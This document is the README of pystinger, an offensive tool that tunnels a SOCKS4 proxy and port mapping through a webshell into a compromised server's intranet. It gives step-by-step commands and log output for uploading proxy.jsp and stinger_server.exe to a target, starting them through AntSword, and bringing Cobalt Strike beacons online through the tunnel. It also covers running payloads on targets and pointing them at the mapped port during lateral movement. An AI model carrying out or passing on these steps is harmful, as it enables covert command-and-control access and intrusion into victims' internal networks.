# pystinger

English | [简体中文](./readme_cn.md) 

Pystinger implements **SOCK4 proxy** and **port mapping** through webshell.

It can be directly used by metasploit-framework, viper, cobalt strike for session online.

Pystinger is developed in python, and currently supports three proxy scripts: php, jsp(x) and aspx.


# Usage
> Suppose the domain name of the server is[ http://example.com :8080](http://192.168.3.11:8080) The intranet IPAddress of the server intranet is 192.168.3.11

## SOCK4 Proxy


* ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe```to start pystinger-server
> Don't run ```D:/xxx/singer_server.exe``` directly,it will cause TCP disconnection
* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
* Your will see following output
```
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```
* Now you have started a *socks4a proxy* on VPS ```127.0.0.1:60000``` for intranet of ```example.com```.
* Now the target server(```example.com```) ```127.0.0.1:60020``` has been mapped to the VPS ``` 127.0.0.1:60020```

## cobaltstrike`s beacon online for single target

* ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe```to start pystinger-server
> Don't run ```D:/xxx/singer_server.exe``` directly,it will cause TCP disconnection
* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
* Your will see following output
```
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```
* Add listener on cobaltstrike,Listener port is ```60020``` (Handler/LISTEN port in ```RAT CONFIG``` of output ),listener address is ```127.0.0.1```
* Generate payload,upload to the target and run.

## cobaltstrike`s beacon online for multi targets

* ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe  192.168.3.11```to start pystinger-server (192.168.3.11 is intranet ipaddress of the target)
> 192.168.3.11 can change to 0.0.0.0
* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
* Your will see following output
```
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 192.168.3.11:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 192.168.3.11:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```
* Add listener on cobaltstrike,Listener port is ```60020``` (Handler/LISTEN port in ```RAT CONFIG``` of output ),listener address is ```192.168.3.11```
* Generate payload,upload to the target and run.
* When lateral movement to other hosts, you can point the payload to 192.168.3.11:60020 to make beacon online

## Custom header and proxy
* If the webshell needs to configure cookie or authorization, the request header can be configured through the -- header parameter
```--header "Authorization: XXXXXX,Cookie: XXXXX"```

* If the webshell needs to be accessed by proxy, you can set the proxy through -- proxy
```--proxy "socks5:127.0.0.1:1081"```

# Related tools
[https://github.com/nccgroup/ABPTTS](https://github.com/nccgroup/ABPTTS)

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

[https://github.com/SECFORCE/Tunna](https://github.com/SECFORCE/Tunna)

# Tested
## stinger_server\stinger_client
* windows 
* linux
## proxy.jsp(x)/php/aspx
* php7.2 
* tomcat7.0 
* iis8.0

# Update log
**2.0**
Update time: 2019-09-29
* Socks4 proxy service moves to client

**2.1**
Update time: 2020-01-07
* Support cobaltstrike online (port mapping)

The development is supported by the software from jetbrains.</br>
https://www.jetbrains.com/?from=pystinger

<a href="https://www.jetbrains.com/?from=pystinger" target="_blank">
  <img src="jetbrains.svg">
</a>
